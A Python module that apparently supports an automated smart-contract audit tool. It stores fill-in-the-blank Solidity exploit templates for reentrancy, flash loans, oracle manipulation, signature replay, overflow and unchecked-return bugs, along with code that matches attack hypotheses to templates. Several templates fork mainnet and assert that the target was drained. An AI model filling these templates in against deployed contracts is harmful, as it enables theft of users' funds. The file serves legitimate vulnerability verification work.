"""PoC template library for common vulnerability patterns."""

from dataclasses import dataclass, field
from typing import Dict, Optional, List, Any
from enum import Enum
import re
import threading


class VulnType(Enum):
    """Vulnerability types with template support."""
    REENTRANCY = "reentrancy"
    FLASH_LOAN = "flash_loan"
    ORACLE_MANIPULATION = "oracle"
    ACCESS_CONTROL = "access_control"
    INTEGER_OVERFLOW = "overflow"
    UNCHECKED_RETURN = "unchecked_return"
    CUSTOM = "custom"


@dataclass
class PoCTemplate:
    """Pre-built PoC template with placeholders."""
    vuln_type: VulnType
    name: str
    description: str
    test_template: str
    exploit_template: Optional[str] = None
    placeholders: Dict[str, str] = field(default_factory=dict)
    required_imports: List[str] = field(default_factory=list)
    pattern_keywords: List[str] = field(default_factory=list)


class PoCTemplateLibrary:
    """Library of pre-built PoC templates."""

    def __init__(self):
        self.templates: Dict[VulnType, List[PoCTemplate]] = {}
        self._register_builtin_templates()

    def _register_builtin_templates(self):
        self._register_reentrancy_templates()
        self._register_flash_loan_templates()
        self._register_oracle_templates()
        self._register_access_control_templates()
        self._register_overflow_templates()
        self._register_unchecked_return_templates()

    def get_template(self, vuln_type: VulnType, variant: str = "default") -> Optional[PoCTemplate]:
        """Get template by type and variant name."""
        templates = self.templates.get(vuln_type, [])
        if not templates:
            return None
        for template in templates:
            if variant == "default" and templates.index(template) == 0:
                return template
            if template.name == variant:
                return template
        return None

    def match_hypothesis(self, hypothesis: Any) -> Optional[PoCTemplate]:
        """Match AttackHypothesis to appropriate template using pattern keywords."""
        if not hasattr(hypothesis, 'category') or not hasattr(hypothesis, 'description'):
            return None

        category = getattr(hypothesis, 'category', None)
        if not isinstance(category, str):
            return None
        description = getattr(hypothesis, 'description', None)
        if not isinstance(description, str):
            return None

        category_map = {
            'reentrancy': VulnType.REENTRANCY,
            'flash_loan': VulnType.FLASH_LOAN,
            'oracle': VulnType.ORACLE_MANIPULATION,
            'access_control': VulnType.ACCESS_CONTROL,
            'overflow': VulnType.INTEGER_OVERFLOW,
            'underflow': VulnType.INTEGER_OVERFLOW,
            'unchecked_return': VulnType.UNCHECKED_RETURN,
        }

        vuln_type = None
        category_lower = category.lower()
        for key, vtype in category_map.items():
            if key in category_lower:
                vuln_type = vtype
                break

        if not vuln_type:
            return None

        templates = self.templates.get(vuln_type, [])
        if not templates:
            return None

        desc_lower = description.lower()
        best_score = 0
        best_template = templates[0]

        for template in templates:
            score = sum(1 for kw in template.pattern_keywords if kw.lower() in desc_lower)
            if score > best_score:
                best_score = score
                best_template = template

        return best_template

    def fill_template(self, template: PoCTemplate, context: Dict[str, str]) -> str:
        """Fill template placeholders with context values."""
        required_placeholders = self.get_unfilled_placeholders(template)
        missing = set(required_placeholders) - set(context.keys())
        if missing:
            raise ValueError(f"Missing required placeholders: {missing}")

        safe_context = {}
        for key, value in context.items():
            if not isinstance(value, str):
                value = str(value)
            if not re.match(r'^[A-Z_]+$', key):
                raise ValueError(f"Invalid placeholder name: {key}. Must contain only uppercase letters and underscores.")
            value = value.replace('\\{', '\\\\{')
            value = value.replace('\\}', '\\\\}')
            safe_context[key] = value

        code = template.test_template
        for placeholder, value in safe_context.items():
            code = code.replace(f"{{{placeholder}}}", value)

        if template.exploit_template:
            exploit_code = template.exploit_template
            for placeholder, value in safe_context.items():
                exploit_code = exploit_code.replace(f"{{{placeholder}}}", value)
            code = exploit_code + "\n\n" + code

        remaining = re.findall(r'\{([A-Z_]+)\}', code)
        if remaining:
            raise ValueError(f"Unfilled placeholders detected in output: {set(remaining)}")

        return code

    def get_unfilled_placeholders(self, template: PoCTemplate) -> List[str]:
        """Extract all placeholder names from template."""
        pattern = r'\{([A-Z_]++)\}'
        try:
            placeholders = set(re.findall(pattern, template.test_template))
            if template.exploit_template:
                placeholders.update(re.findall(pattern, template.exploit_template))
        except re.error:
            pattern = r'\{([A-Z_]+)\}'
            placeholders = set(re.findall(pattern, template.test_template))
            if template.exploit_template:
                placeholders.update(re.findall(pattern, template.exploit_template))
        return sorted(placeholders)

    def _register_reentrancy_templates(self):
        template = PoCTemplate(
            vuln_type=VulnType.REENTRANCY,
            name="classic_reentrancy",
            description="Classic reentrancy via receive/fallback hook",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
contract ReentrancyExploit {
    {TARGET_CONTRACT} public target;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;
    constructor(address _target) {
        target = {TARGET_CONTRACT}(_target);
    }
    function attack() external payable {
        target.{VULNERABLE_FUNCTION}{value: msg.value}({FUNCTION_ARGS});
    }
    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance > 0) {
            attackCount++;
            target.{VULNERABLE_FUNCTION}({REENTRY_ARGS});
        }
    }
}
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    ReentrancyExploit exploit;
    function setUp() public {
        {SETUP_TARGET}
        vm.deal(address(target), {INITIAL_BALANCE});
        exploit = new ReentrancyExploit(address(target));
    }
    function testReentrancy() public {
        uint256 targetBalanceBefore = address(target).balance;
        uint256 exploitBalanceBefore = address(exploit).balance;
        vm.deal(address(exploit), {EXPLOIT_FUNDING});
        exploit.attack{value: {EXPLOIT_FUNDING}}();
        uint256 targetBalanceAfter = address(target).balance;
        uint256 exploitBalanceAfter = address(exploit).balance;
        assertLt(targetBalanceAfter, targetBalanceBefore, "Target balance not drained");
        assertGt(exploitBalanceAfter, exploitBalanceBefore, "Exploit did not profit");
        uint256 profit = targetBalanceBefore - targetBalanceAfter;
        console.log("Reentrancy successful!");
        console.log("Drained from target:", profit);
        console.log("Attack iterations:", exploit.attackCount());
    }
}''',
            placeholders={"TARGET_CONTRACT": "Name of vulnerable contract", "TARGET_PATH": "Import path", "VULNERABLE_FUNCTION": "Function with reentrancy", "FUNCTION_ARGS": "Arguments for initial call", "REENTRY_ARGS": "Arguments for reentry", "SETUP_TARGET": "Target deployment", "INITIAL_BALANCE": "Initial target balance", "EXPLOIT_FUNDING": "Exploit funding"},
            pattern_keywords=["reentrancy", "reenter", "callback", "receive", "fallback", "state update"]
        )
        self.templates.setdefault(VulnType.REENTRANCY, []).append(template)

        template = PoCTemplate(
            vuln_type=VulnType.REENTRANCY,
            name="token_callback_reentrancy",
            description="Reentrancy via ERC777/ERC721 callback",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
import {IERC721Receiver} from "forge-std/interfaces/IERC721Receiver.sol";
contract TokenCallbackExploit is IERC721Receiver {
    {TARGET_CONTRACT} public target;
    bool public attacking;
    constructor(address _target) {
        target = {TARGET_CONTRACT}(_target);
    }
    function attack() external {
        attacking = true;
        {INITIAL_CALL}
    }
    function onERC721Received(address, address, uint256, bytes memory) external override returns (bytes4) {
        if (attacking) {
            attacking = false;
            {REENTRY_CALL}
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    TokenCallbackExploit exploit;
    function setUp() public {
        {SETUP_TARGET}
        exploit = new TokenCallbackExploit(address(target));
    }
    function testTokenCallbackReentrancy() public {
        {SETUP_STATE}
        uint256 targetBalanceBefore = {BALANCE_CHECK};
        exploit.attack();
        uint256 targetBalanceAfter = {BALANCE_CHECK};
        assertLt(targetBalanceAfter, targetBalanceBefore, "Reentrancy exploit failed");
        console.log("Drained:", targetBalanceBefore - targetBalanceAfter);
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "INITIAL_CALL": "First call", "REENTRY_CALL": "Reentry call", "SETUP_TARGET": "Deployment", "SETUP_STATE": "State setup", "BALANCE_CHECK": "Balance check"},
            pattern_keywords=["erc777", "erc721", "token", "callback", "tokensReceived", "onERC721Received"]
        )
        self.templates.setdefault(VulnType.REENTRANCY, []).append(template)

    def _register_flash_loan_templates(self):
        template = PoCTemplate(
            vuln_type=VulnType.FLASH_LOAN,
            name="aave_flash_loan",
            description="Aave V3 flash loan exploit",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
import {IPool} from "@aave/core-v3/contracts/interfaces/IPool.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
contract FlashLoanExploit {
    IPool public aavePool;
    {TARGET_CONTRACT} public target;
    address public token;
    constructor(address _aavePool, address _target, address _token) {
        aavePool = IPool(_aavePool);
        target = {TARGET_CONTRACT}(_target);
        token = _token;
    }
    function attack(uint256 flashAmount) external {
        address[] memory assets = new address[](1);
        assets[0] = token;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aavePool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }
    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata) external returns (bool) {
        require(msg.sender == address(aavePool), "Unauthorized");
        IERC20(token).approve(address(target), amounts[0]);
        {EXPLOIT_LOGIC}
        uint256 amountOwed = amounts[0] + premiums[0];
        IERC20(token).approve(address(aavePool), amountOwed);
        return true;
    }
}
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    FlashLoanExploit exploit;
    address constant AAVE_POOL = {AAVE_POOL_ADDRESS};
    address constant TOKEN = {TOKEN_ADDRESS};
    function setUp() public {
        vm.createSelectFork({FORK_RPC});
        {SETUP_TARGET}
        exploit = new FlashLoanExploit(AAVE_POOL, address(target), TOKEN);
    }
    function testFlashLoanExploit() public {
        uint256 exploitBalanceBefore = IERC20(TOKEN).balanceOf(address(exploit));
        exploit.attack({FLASH_AMOUNT});
        uint256 exploitBalanceAfter = IERC20(TOKEN).balanceOf(address(exploit));
        assertGt(exploitBalanceAfter, exploitBalanceBefore, "Flash loan exploit failed");
        console.log("Profit:", exploitBalanceAfter - exploitBalanceBefore);
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "EXPLOIT_LOGIC": "Manipulation logic", "AAVE_POOL_ADDRESS": "Aave pool", "TOKEN_ADDRESS": "Token", "FORK_RPC": "RPC URL", "SETUP_TARGET": "Deployment", "FLASH_AMOUNT": "Flash amount"},
            pattern_keywords=["flash loan", "aave", "lending", "borrow", "liquidity", "price manipulation"]
        )
        self.templates.setdefault(VulnType.FLASH_LOAN, []).append(template)

        template = PoCTemplate(
            vuln_type=VulnType.FLASH_LOAN,
            name="uniswap_flash_swap",
            description="UniswapV2 flash swap exploit",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
contract FlashSwapExploit {
    IUniswapV2Pair public pair;
    {TARGET_CONTRACT} public target;
    address public token0;
    address public token1;
    constructor(address _pair, address _target) {
        pair = IUniswapV2Pair(_pair);
        target = {TARGET_CONTRACT}(_target);
        token0 = pair.token0();
        token1 = pair.token1();
    }
    function attack(uint256 amount0, uint256 amount1) external {
        bytes memory data = abi.encode(msg.sender);
        pair.swap(amount0, amount1, address(this), data);
    }
    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(pair), "Unauthorized");
        address token = amount0 > 0 ? token0 : token1;
        uint256 amount = amount0 > 0 ? amount0 : amount1;
        {EXPLOIT_LOGIC}
        uint256 fee = (amount * 3) / 997 + 1;
        uint256 amountToRepay = amount + fee;
        IERC20(token).transfer(address(pair), amountToRepay);
    }
}
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    FlashSwapExploit exploit;
    address constant PAIR = {PAIR_ADDRESS};
    function setUp() public {
        vm.createSelectFork({FORK_RPC});
        {SETUP_TARGET}
        exploit = new FlashSwapExploit(PAIR, address(target));
    }
    function testFlashSwapExploit() public {
        address token = {TOKEN_ADDRESS};
        uint256 exploitBalanceBefore = IERC20(token).balanceOf(address(exploit));
        exploit.attack({AMOUNT0}, {AMOUNT1});
        uint256 exploitBalanceAfter = IERC20(token).balanceOf(address(exploit));
        assertGt(exploitBalanceAfter, exploitBalanceBefore, "Flash swap exploit failed");
        console.log("Profit:", exploitBalanceAfter - exploitBalanceBefore);
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "EXPLOIT_LOGIC": "Manipulation logic", "PAIR_ADDRESS": "Pair address", "TOKEN_ADDRESS": "Token", "FORK_RPC": "RPC URL", "SETUP_TARGET": "Deployment", "AMOUNT0": "Token0 amount", "AMOUNT1": "Token1 amount"},
            pattern_keywords=["flash swap", "uniswap", "dex", "swap", "liquidity"]
        )
        self.templates.setdefault(VulnType.FLASH_LOAN, []).append(template)

    def _register_oracle_templates(self):
        template = PoCTemplate(
            vuln_type=VulnType.ORACLE_MANIPULATION,
            name="twap_manipulation",
            description="TWAP oracle manipulation",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    IUniswapV2Pair pair;
    address constant PAIR_ADDRESS = {PAIR_ADDRESS};
    address token0;
    address token1;
    function setUp() public {
        vm.createSelectFork({FORK_RPC});
        {SETUP_TARGET}
        pair = IUniswapV2Pair(PAIR_ADDRESS);
        token0 = pair.token0();
        token1 = pair.token1();
    }
    function testTWAPManipulation() public {
        uint256 targetBalanceBefore = {BALANCE_CHECK};
        uint256 swapAmount = {SWAP_AMOUNT};
        deal(token0, address(this), swapAmount);
        IERC20(token0).transfer(address(pair), swapAmount);
        (uint112 reserve0Before, uint112 reserve1Before,) = pair.getReserves();
        uint256 amount1Out = (swapAmount * reserve1Before) / (reserve0Before + swapAmount);
        pair.swap(0, amount1Out, address(this), "");
        vm.warp(block.timestamp + {TWAP_PERIOD});
        vm.roll(block.number + 1);
        {EXPLOIT_CALL}
        uint256 targetBalanceAfter = {BALANCE_CHECK};
        assertLt(targetBalanceAfter, targetBalanceBefore, "Oracle manipulation failed");
        console.log("Drained from target:", targetBalanceBefore - targetBalanceAfter);
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "PAIR_ADDRESS": "Pair address", "FORK_RPC": "RPC URL", "SETUP_TARGET": "Deployment", "BALANCE_CHECK": "Balance check", "SWAP_AMOUNT": "Swap amount", "TWAP_PERIOD": "TWAP period", "EXPLOIT_CALL": "Exploit call"},
            pattern_keywords=["twap", "oracle", "price manipulation", "uniswap", "spot price"]
        )
        self.templates.setdefault(VulnType.ORACLE_MANIPULATION, []).append(template)

        template = PoCTemplate(
            vuln_type=VulnType.ORACLE_MANIPULATION,
            name="stale_oracle",
            description="Stale Chainlink oracle exploit",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
import {AggregatorV3Interface} from "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    AggregatorV3Interface oracle;
    address constant ORACLE_ADDRESS = {ORACLE_ADDRESS};
    function setUp() public {
        vm.createSelectFork({FORK_RPC});
        {SETUP_TARGET}
        oracle = AggregatorV3Interface(ORACLE_ADDRESS);
    }
    function testStaleOracleExploit() public {
        (, int256 priceBefore,, uint256 updatedAt,) = oracle.latestRoundData();
        console.log("Oracle price before:", uint256(priceBefore));
        console.log("Last updated:", updatedAt);
        vm.warp(block.timestamp + {STALENESS_PERIOD});
        uint256 targetBalanceBefore = {BALANCE_CHECK};
        {EXPLOIT_CALL}
        uint256 targetBalanceAfter = {BALANCE_CHECK};
        assertLt(targetBalanceAfter, targetBalanceBefore, "Stale oracle exploit failed");
        console.log("Drained:", targetBalanceBefore - targetBalanceAfter);
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "ORACLE_ADDRESS": "Oracle address", "FORK_RPC": "RPC URL", "SETUP_TARGET": "Deployment", "STALENESS_PERIOD": "Staleness period", "BALANCE_CHECK": "Balance check", "EXPLOIT_CALL": "Exploit call"},
            pattern_keywords=["chainlink", "oracle", "stale", "timestamp", "heartbeat"]
        )
        self.templates.setdefault(VulnType.ORACLE_MANIPULATION, []).append(template)

    def _register_access_control_templates(self):
        template = PoCTemplate(
            vuln_type=VulnType.ACCESS_CONTROL,
            name="missing_auth",
            description="Missing authorization check exploit",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    address attacker;
    function setUp() public {
        {SETUP_TARGET}
        attacker = makeAddr("attacker");
    }
    function testMissingAuthorizationCheck() public {
        {INITIAL_STATE_CHECK}
        vm.startPrank(attacker);
        {PRIVILEGED_CALL}
        vm.stopPrank();
        {FINAL_STATE_CHECK}
        console.log("Unauthorized access successful!");
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "SETUP_TARGET": "Deployment", "INITIAL_STATE_CHECK": "Initial state check", "PRIVILEGED_CALL": "Privileged call", "FINAL_STATE_CHECK": "Final state check"},
            pattern_keywords=["access control", "authorization", "onlyOwner", "privilege", "admin", "missing modifier"]
        )
        self.templates.setdefault(VulnType.ACCESS_CONTROL, []).append(template)

        template = PoCTemplate(
            vuln_type=VulnType.ACCESS_CONTROL,
            name="signature_replay",
            description="Signature replay exploit",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    uint256 authorizedPrivateKey;
    address authorizedSigner;
    function setUp() public {
        {SETUP_TARGET}
        authorizedPrivateKey = 0x1234;
        authorizedSigner = vm.addr(authorizedPrivateKey);
    }
    function testSignatureReplay() public {
        bytes32 messageHash = {MESSAGE_HASH};
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(authorizedPrivateKey, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        {FIRST_CALL}
        uint256 balanceAfterFirst = {BALANCE_CHECK};
        {REPLAY_CALL}
        uint256 balanceAfterReplay = {BALANCE_CHECK};
        assertLt(balanceAfterReplay, balanceAfterFirst, "Signature replay failed");
        console.log("Signature replayed successfully!");
        console.log("Drained:", balanceAfterFirst - balanceAfterReplay);
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "SETUP_TARGET": "Deployment", "MESSAGE_HASH": "Message hash", "FIRST_CALL": "First call", "BALANCE_CHECK": "Balance check", "REPLAY_CALL": "Replay call"},
            pattern_keywords=["signature", "replay", "nonce", "ecrecover", "permit", "meta-transaction"]
        )
        self.templates.setdefault(VulnType.ACCESS_CONTROL, []).append(template)

    def _register_overflow_templates(self):
        template = PoCTemplate(
            vuln_type=VulnType.INTEGER_OVERFLOW,
            name="integer_overflow",
            description="Integer overflow (Solidity <0.8)",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    function setUp() public {
        {SETUP_TARGET}
    }
    function testIntegerOverflow() public {
        {INITIAL_SETUP}
        uint256 targetBalanceBefore = {BALANCE_CHECK};
        {OVERFLOW_TRIGGER}
        uint256 targetBalanceAfter = {BALANCE_CHECK};
        assertLt(targetBalanceAfter, targetBalanceBefore, "Integer overflow exploit failed");
        console.log("Drained via overflow:", targetBalanceBefore - targetBalanceAfter);
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "SETUP_TARGET": "Deployment", "INITIAL_SETUP": "Initial setup", "BALANCE_CHECK": "Balance check", "OVERFLOW_TRIGGER": "Overflow trigger"},
            pattern_keywords=["overflow", "underflow", "arithmetic", "unchecked", "solidity 0.7"]
        )
        self.templates.setdefault(VulnType.INTEGER_OVERFLOW, []).append(template)

        template = PoCTemplate(
            vuln_type=VulnType.INTEGER_OVERFLOW,
            name="unchecked_overflow",
            description="Unchecked{} block overflow (Solidity >=0.8)",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    function setUp() public {
        {SETUP_TARGET}
    }
    function testUncheckedOverflow() public {
        {INITIAL_SETUP}
        uint256 targetBalanceBefore = {BALANCE_CHECK};
        {OVERFLOW_TRIGGER}
        uint256 targetBalanceAfter = {BALANCE_CHECK};
        assertLt(targetBalanceAfter, targetBalanceBefore, "Unchecked overflow exploit failed");
        console.log("Drained via unchecked overflow:", targetBalanceBefore - targetBalanceAfter);
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "SETUP_TARGET": "Deployment", "INITIAL_SETUP": "Initial setup", "BALANCE_CHECK": "Balance check", "OVERFLOW_TRIGGER": "Overflow trigger"},
            pattern_keywords=["unchecked", "overflow", "arithmetic", "solidity 0.8"]
        )
        self.templates.setdefault(VulnType.INTEGER_OVERFLOW, []).append(template)

    def _register_unchecked_return_templates(self):
        template = PoCTemplate(
            vuln_type=VulnType.UNCHECKED_RETURN,
            name="unchecked_call",
            description="Unchecked low-level call return value",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
contract MaliciousReceiver {
    receive() external payable {
        revert("Call failed");
    }
}
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    MaliciousReceiver malicious;
    function setUp() public {
        {SETUP_TARGET}
        malicious = new MaliciousReceiver();
    }
    function testUncheckedCallReturn() public {
        vm.deal(address(target), {INITIAL_BALANCE});
        uint256 targetBalanceBefore = address(target).balance;
        {EXPLOIT_CALL}
        uint256 targetBalanceAfter = address(target).balance;
        {STATE_VERIFICATION}
        console.log("Unchecked call exploited successfully!");
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "SETUP_TARGET": "Deployment", "INITIAL_BALANCE": "Initial balance", "EXPLOIT_CALL": "Exploit call", "STATE_VERIFICATION": "State verification"},
            pattern_keywords=["unchecked", "call", "return value", "low-level", "transfer", "send"]
        )
        self.templates.setdefault(VulnType.UNCHECKED_RETURN, []).append(template)

        template = PoCTemplate(
            vuln_type=VulnType.UNCHECKED_RETURN,
            name="unchecked_erc20",
            description="Unchecked ERC20 transfer return value",
            test_template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {{{TARGET_CONTRACT}}} from "{TARGET_PATH}";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
contract FakeToken {
    function transfer(address, uint256) external pure returns (bool) {
        return false;
    }
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }
    function balanceOf(address) external pure returns (uint256) {
        return type(uint256).max;
    }
    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}
contract ExploitTest is Test {
    {TARGET_CONTRACT} target;
    FakeToken fakeToken;
    function setUp() public {
        {SETUP_TARGET}
        fakeToken = new FakeToken();
    }
    function testUncheckedERC20Transfer() public {
        {INITIAL_SETUP}
        uint256 targetBalanceBefore = {BALANCE_CHECK};
        {EXPLOIT_CALL}
        uint256 targetBalanceAfter = {BALANCE_CHECK};
        assertLt(targetBalanceAfter, targetBalanceBefore, "Unchecked ERC20 exploit failed");
        console.log("Exploited via unchecked ERC20 return!");
    }
}''',
            placeholders={"TARGET_CONTRACT": "Vulnerable contract", "TARGET_PATH": "Import path", "SETUP_TARGET": "Deployment", "INITIAL_SETUP": "Initial setup", "BALANCE_CHECK": "Balance check", "EXPLOIT_CALL": "Exploit call"},
            pattern_keywords=["erc20", "transfer", "unchecked", "return value", "token"]
        )
        self.templates.setdefault(VulnType.UNCHECKED_RETURN, []).append(template)


_library: Optional[PoCTemplateLibrary] = None
_library_lock = threading.Lock()


def get_template_library() -> PoCTemplateLibrary:
    """Get singleton template library instance."""
    global _library
    if _library is None:
        with _library_lock:
            if _library is None:
                _library = PoCTemplateLibrary()
    return _library


def reset_library():
    """Reset singleton library (for testing)."""
    global _library
    with _library_lock:
        _library = None
